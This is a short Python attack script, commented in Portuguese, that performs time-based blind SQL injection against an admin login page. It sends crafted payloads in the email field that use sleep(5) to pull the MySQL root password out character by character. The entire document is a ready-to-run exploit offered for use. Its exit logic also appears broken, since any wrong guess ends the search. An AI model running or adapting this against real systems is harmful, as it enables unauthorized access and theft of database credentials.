import requests, sys, time

url = "http://site.com/admin/login.php?action=login2"
payload = {"email": ""}
caracteres = ' !"#$%&()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]^_`abcdefghijklmnopqrstuvwxyz{|}~'
valor = ''
tamanho = 60

## Script para obter apenas um valor ##

# Iteração sobre a posição do caractere
for i in range(1, tamanho + 1):
    # Itera sobre a lista de caracteres
    for c in caracteres:
        # Payload que será enviado. Variável i contém a posição do caractere e variável c contém o caractere a ser testado
        payload["email"] = f"hacker@mail.com' or if(ascii(substring((select password from mysql.user where user = 'root'),{i},1))={ord(c)}, sleep(5), 0) #"

        # Marcação do tempo da requisição e o tempo da resposta
        tempo_envio = time.time()
        r = requests.post(url, data=payload)
        tempo_resposta = time.time()

        # Se o servidor demorar mais de 5 segundos para responder, marca o caractere
        if tempo_resposta - tempo_envio > 5:
            valor += c
            print(f"{c}", end="")
            break
        
      # Se o servidor demorar menos de 3 segundos, a busca é encerrada
        # Provavelmente erro do payload ou não há mais caracteres
        if tempo_resposta - tempo_envio < 3:
            print("\r\n# Fim da busca #")
            sys.exit()
